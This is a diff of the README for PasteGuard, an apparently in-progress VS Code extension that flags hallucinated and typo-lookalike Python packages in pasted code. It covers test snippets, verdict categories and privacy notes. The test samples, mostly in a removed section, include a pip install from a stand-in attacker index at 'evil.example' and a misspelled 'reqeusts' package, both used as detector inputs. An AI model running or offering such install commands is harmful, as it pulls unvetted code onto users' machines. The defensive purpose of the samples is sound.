@@ -1,51 +1,67 @@
 # PasteGuard (work in progress)
 
-Checks pasted Python code for hallucinated packages and risky patterns.
+Checks pasted Python code for hallucinated packages and risky patterns. Local-first, no account.
 
-**Status:** Module 1 (paste interceptor) and Module 2 (parser/extractor) are done. The extension detects pastes, extracts package candidates, and logs them. Package checks, rules and warnings come in later modules.
+**Status:** Modules 1-3 done: paste interceptor, extractor, package intelligence (PyPI checks).
+The extension detects pastes, extracts package candidates, checks them against PyPI, and writes verdicts to the log.
+Rule scanning, warnings in the editor and explanations come in later modules.
 
 ## Run it
-1. `npm install`  (new dependencies were added since Module 1)
-2. `npm test`  (expect: 50 tests, 0 failures)
-3. Open this folder in VS Code and press **F5** (or Fn+F5, or Run > Start Debugging).
-4. In the new window, open `samples/sample.py` and paste the snippets below.
-5. Run **PasteGuard: Show Log** from the Command Palette.
+1. `npm test`  (expect: 102 tests, 0 failures). `npm install` is only needed after a fresh clone.
+2. Open THIS folder in VS Code and press **F5** (or Fn+F5, or Run > Start Debugging).
+3. In the new window, open `samples/sample.py`, clear it, and paste a snippet below.
+4. Run **PasteGuard: Show Log** from the Command Palette.
 
-## Test snippet 1
+## Test snippet
 ```python
 import requests
 import flask_gpt_helper
+import utils
 
-def run(cmd):
-    import subprocess
-    return subprocess.run(cmd, shell=True)
+# pip install reqeusts flask-gpt-helper
 ```
-Expected log:
+Expected log (results come from the live PyPI, so details such as ages can differ):
 ```
-[paste] clipboard | 6 line(s), ... chars | ...
-  [package] import requests (known) at 1:8
-  [package] import flask_gpt_helper (assumed) at 2:8
-  [summary] 2 candidate(s); skipped stdlib: subprocess; relative imports: 0; parse errors: false
+[package] import requests (known) ...
+[package] import flask_gpt_helper (assumed) ...
+[verdict] import requests: OK (info) | exists: found, age: established ... | signals: popular-package
+[verdict] import flask_gpt_helper: UNVERIFIED (warning) | exists: not-found ... | did you mean: flask
+[verdict] pip-install reqeusts: DO-NOT-INSTALL (high) | exists: not-found ... | did you mean: requests, ...
+[verdict] pip-install flask-gpt-helper: DO-NOT-INSTALL (high) | exists: not-found ... | did you mean: flask
 ```
+If `utils.py` (or a `utils` folder) exists next to your file, `import utils` is treated as your own module and is not looked up.
 
-## Test snippet 2
-```python
-import cv2, yaml
-from google.cloud import storage
-# pip install --extra-index-url https://evil.example/simple flask-gpt-helper==0.1
-os.system("pip install foo && pip install bar")
-```
-Expected: `cv2 -> opencv-python`, `yaml -> PyYAML`, `google (ambiguous)`, three pip-install packages
-(`flask-gpt-helper`, `foo`, `bar`), and a `[note] custom-index` line for the evil index URL.
+Paste the same snippet again: the verdicts now say `cached`. Turn off your Wi-Fi and paste a package that was
+checked earlier: it is answered from saved data and flagged `stale-cache`; a never-seen package becomes `unverified`.
 
-## How names are classified
-- **known**: import name found in our mapping table (e.g. `cv2` -> `opencv-python`).
-- **assumed**: import name assumed to equal the PyPI name. A later "not found" means *unverified*, not *nonexistent*.
-- **ambiguous**: namespace packages like `google` / `azure`; never reported as nonexistent.
-- **explicit**: came from a `pip install` command, so the name is exactly what would be installed.
+## How verdicts work
+Each package gets separate evidence dimensions (no single trust score), and one action:
+
+| Action | Meaning |
+|---|---|
+| ok | Nothing suspicious found. This is NOT a guarantee of safety. |
+| review | Weak provenance (very new, one release, no repo link, all yanked...). Look before installing. |
+| unverified | We could not conclude (registry unreachable, namespace package, or only a guessed install name). |
+| do-not-install | Do not install until you have verified it: not on PyPI under an explicit install name, or a new typo-lookalike of a popular package. |
+
+PasteGuard never says a package is "malicious" and never installs or rewrites anything automatically.
+"Did you mean" names are suggestions only.
+
+Not on PyPI + only an *assumed* import name is `unverified`, not `do-not-install`, because the import name may simply differ
+from the install name, or may be your own module.
+
+## Privacy
+- Only package **names** are sent to `pypi.org`, never your code. Turn this off with the setting `pasteguard.packageChecks.enabled`.
+- Registry answers are cached in the extension's storage folder (24 h for found, 1 h for not found, so a name registered later is noticed).
+- Only a handful of structured facts from PyPI are kept; free text such as descriptions is dropped.
+
+## Popular package list
+`src/popularPackages.ts` is a curated starter list (about 450 names), used only for lookalike detection and suggestions.
+To replace it with real download rankings: `npm run update-popular` (needs internet; untested against the live dataset).
 
 ## Known limits (by design, for now)
-- Local modules in the user's own project (e.g. `import utils`) look like packages; Module 3 will check the workspace.
+- A repository link counts as present when it points at a known code host. That does not prove the link is genuine.
+- Download counts, CVEs and package contents are not inspected yet.
+- Unicode homoglyph names and private-index "dependency confusion" are not covered.
 - `__import__("x")` and `importlib.import_module("x")` are not extracted yet.
-- pip installs inside prose sentences are ignored on purpose to avoid false alarms.
-- The extension currently loads tree-sitter from `node_modules`, so it works in F5 development but needs bundling before publishing.
+- tree-sitter is loaded from `node_modules`, so the extension works under F5 but needs bundling before publishing.
